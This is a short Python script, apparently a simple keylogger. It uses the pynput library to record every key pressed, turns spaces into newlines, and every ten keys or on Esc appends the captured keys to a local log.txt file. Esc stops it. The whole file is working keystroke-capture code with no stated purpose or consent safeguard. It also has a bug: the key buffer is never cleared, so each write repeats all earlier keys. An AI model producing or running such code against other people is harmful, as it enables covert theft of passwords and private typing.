import pynput
import os

from pynput.keyboard import Key, Listener

count = 0
keys = []

# * make a log file if it doesn't exist
if not os.path.exists("./log.txt"):
    with open("./log.txt", mode="w") as empty_log:
        empty_log.write("")

def press(key):
    global count, keys
    key = str(key).replace("'", "")
    key = key.replace("Key.", "")
    if key == "space":
        key = "\n"
    keys.append(key)
    count += 1
    
    if count >= 10 or key == "esc":
        count = 0
        write_file()
    # print(f"{key}")

def write_file():
    with open("./log.txt", mode="a") as log:
        for k in keys:
            if k == "\n":
                log.write(k)
            else:
                log.write(f"{k} ")

def release(key):
    # * Provide an exit by esc key
    if key == Key.esc:
        return False

with Listener(on_press=press, on_release=release) as listener:
    listener.join()
